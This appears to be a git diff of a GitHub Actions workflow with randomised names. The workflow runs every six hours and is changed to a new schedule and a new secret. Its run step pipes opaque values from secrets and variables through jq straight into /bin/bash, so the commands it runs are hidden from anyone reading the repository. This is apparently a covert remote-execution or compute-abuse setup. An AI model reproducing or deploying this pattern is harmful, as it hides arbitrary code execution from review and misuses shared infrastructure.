@@ -1,9 +1,8 @@
 name: qiqaindyh
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +10,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiqaindyh
         env:
-          af0: ${{ secrets.af0 }}
+          jntdj7615: ${{ secrets.jntdj7615 }}
         run: |
-          echo $af0 | jq -r .p9 | /bin/bash
-          echo $q4367 | jq -r .sq38523 | /bin/bash
-          echo $hfnh27 | jq -r .yk399 | /bin/bash
-          echo $bojsc43348 | jq -r .yk0842 | /bin/bash
-          echo $dooa76441 | jq -r .otjvw39424 | /bin/bash
-          echo $pca7 | jq -r .qj0 | /bin/bash
-          echo $wisvf186 | jq -r .jkyqh2978 | /bin/bash
-          echo $gznz8147 | jq -r .xkamu42 | /bin/bash
-          echo $qtmu720 | jq -r .z406 | /bin/bash
-          echo $aes00 | jq -r .onuf29 | /bin/bash
-          echo $jhfw95 | jq -r .l2 | /bin/bash
-          echo $c52292 | jq -r .myj8722 | /bin/bash
+          echo $jntdj7615 | jq -r .v1 | /bin/bash
+          echo $wyqc867 | jq -r .pnmj15518 | /bin/bash
+          echo $g571 | jq -r .van15726 | /bin/bash
+          echo $pxy91436 | jq -r .fc611 | /bin/bash
+          echo $qvm9 | jq -r .bbbhy93 | /bin/bash
 
